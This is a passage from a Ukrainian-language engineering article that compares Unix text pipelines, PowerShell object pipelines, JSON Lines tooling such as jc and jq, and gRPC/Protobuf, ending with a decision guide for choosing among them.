Для утиліт, які не мають нативного прапорця `--json` (наприклад, `df`, `ps`, `netstat`, `dig`, `uptime`), створено утиліту-транслятор **`jc` (JSON CLI)**. Вона приймає сирий вивід понад 100 класичних утиліт POSIX і на льоту парсить його у строго типізований документ JSON:

```bash
# Отримання відсотка вільного місця на кореневому розділі через jc та jq
df / | jc --df | jq '.[0].capacity_percent'
```

Поєднання `JSON Lines` (`ndjson`), бібліотеки швидкісного SIMD-парсингу `simdjson` та потокових процесорів `jq`/`yq` дозволило інженерам отримати найкраще з обох світів:
1. **Збереження архітектури Unix:** Універсальність каналів IPC, простота передачі через SSH, слабка зв'язність і відсутність важкого монолітного рантайму.
2. **Переваги об'єктного підходу:** Імунітет до пробілів, типізовані поля (числа, булеві прапорці), стійкість до зміни порядку колонок та легкість автоматизації.

### 3. Бінарні контракти та структуровані RPC у хмарній інфраструктурі

У сервісно-орієнтованих архітектурах та платформах спостережуваності (OpenTelemetry, Prometheus Remote Write, Envoy Service Mesh) внутрішні конвеєри передачі метрик і логів повністю перейшли на бінарні потоки gRPC та Protocol Buffers. Це забезпечує передбачуваний бюджет пам'яті, контроль зворотного тиску (backpressure) на рівні окремого RPC-потоку та усуває навантаження на процесори від постійного текстового синтаксичного аналізу.

## Інженерний дороговказ: яку парадигму обирати

```
                            Яка природа вашої задачі?
                                         │
              ┌──────────────────────────┴──────────────────────────┐
              ▼                                                     ▼
Високонавантажена потокова обробка                  Складна логіка адміністрування
або низькорівневі системні демони                     та управління інфраструктурою
              │                                                     │
     ┌────────┴────────┐                                   ┌────────┴────────┐
     ▼                 ▼                                   ▼                 ▼
Обробка гігабайтів    Максимальна міжмовна        Інфраструктура      Гетерогенна хмарна
тексту/метрик/логів   сумісність у Linux          Windows / .NET      інфраструктура (K8s/Linux)
     │                 │                                   │                 │
     ▼                 ▼                                   ▼                 ▼
Сирий потік Unix      POSIX конвеєри                      PowerShell        CLI з прапорцем --json
(grep, sed, awk)      + угода \0 (NUL)                    (PSObject)        + процесор jq / JSONL
(або gRPC/Protobuf    (або Nushell)                                         (або FlatBuffers)
для розподіленого IPC)
```

1. **Обирайте сирий текстовий потік Unix (`grep`, `sed`, `awk`, `find -print0`), коли:**
   - Потрібна максимальна швидкість фільтрації (гігабайти на секунду) з нульовими витратами пам'яті `O(1)` та максимальною утилізацією кешу L1/L2 через лінійний SIMD-доступ.
   - Скрипти пишуться для базових POSIX-сумісних систем, вбудованих пристроїв (Embedded Linux, BusyBox) або мінімальних контейнерів, де немає сторонніх середовищ виконання.
   - Дані мають просту лінійну структуру записів, розділених символом `\n`, а передача виконується через локальні канали IPC ядра.

2. **Обирайте об'єктний конвеєр PowerShell (`PSObject`), коли:**
   - Виконується автоматизація та адміністрування інфраструктури Windows, Active Directory, Exchange або Azure.
   - Сценарії маніпулюють складними об'єктами з багатими типами (`DateTimeOffset`, права доступу ACL, класифікатори WMI/CIM).
   - Швидкість розробки, повна безпека від ін'єкцій параметрів та стійкість до змін форматування важливіші за накладні витрати оперативної пам'яті та процесора.

3. **Обирайте структурований потік JSON Lines (`CLI --json` + `jq` / Nushell), коли:**
   - Будуються сучасні сценарії DevOps, CI/CD та хмарної автоматизації (Kubernetes, AWS/GCP CLI, Docker).
   - Дані мають глибоку вкладену ієрархію (масиви, вкладені об'єкти, хеш-таблиці).
   - Необхідно поєднати мовну відкритість та легкість передачі через мережу з абсолютною стійкістю до зміни візуального форматування системних утиліт.

4. **Обирайте бінарні типізовані RPC (gRPC / Protocol Buffers / FlatBuffers), коли:**
   - Будуються високопродуктивні розподілені конвеєри передачі подій, метрик або логів між сервісами.
   - Необхідно мінімізувати мережевий трафік (стиснення числових полів Varint, відсутність дублювання текстових ключів) та накладні витрати процесора на серіалізацію.
   - Потрібне мультиплексування багатьох логічних потоків через одне TCP/QUIC-з'єднання з гранулярним контролем потоку (per-stream flow control) та суворою гарантією сумісності версій схеми.
